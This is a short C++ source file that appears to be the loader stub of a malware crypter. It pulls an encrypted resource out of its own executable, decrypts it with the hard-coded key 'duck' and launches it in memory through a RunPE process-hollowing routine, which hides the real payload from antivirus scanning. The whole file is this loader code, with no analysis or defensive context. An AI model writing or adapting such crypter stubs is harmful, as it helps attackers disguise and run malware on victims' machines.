#include "Encrypt.h"
#include "RunPE.h"

std::vector<char> get_resource_file(int id)
{
	std::vector<char> resource_data;
	size_t rsize;
	HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCEA(69), MAKEINTRESOURCEA(id));
	HGLOBAL temp_data = LoadResource(NULL, hResource);
	rsize = SizeofResource(NULL, hResource);
	resource_data.resize(rsize);
	memcpy((void*)resource_data.data(), temp_data, rsize);
	return resource_data;
}

int main()
{
	char output[255] = "crypted.exe";
	std::vector<char> resource_data = get_resource_file(10);
	if (resource_data.data())
	{
		std::vector<char> key = { 'd','u','c','k' };
		resource_data = decrypt(resource_data, key);
		LPVOID pFile = resource_data.data();
		RunPE(pFile);
	}
}